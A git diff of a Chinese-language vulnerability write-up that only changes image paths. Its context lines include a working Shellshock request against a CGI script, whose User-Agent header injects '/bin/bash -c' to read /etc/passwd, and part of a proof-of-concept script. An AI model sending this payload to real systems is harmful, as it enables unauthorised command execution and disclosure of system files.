@@ -151,7 +151,7 @@ exit 0;
 
 发送如下请求即可命令执行
 
-![](./images/202202162259032.png)
+![](images/202202162259032.png)
 
 ```shell
 GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh
@@ -160,7 +160,7 @@ User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
 
 发送请求会下载一个文件，文件内容为命令执行的结果
 
-![](./images/202202162259265.png)
+![](images/202202162259265.png)
 
 ## 漏洞POC
 
@@ -222,4 +222,4 @@ if __name__ == '__main__':
     POC_1(target_url, cmd)
 ```
 
-![](./images/202202162259317.png)
+![](images/202202162259317.png)
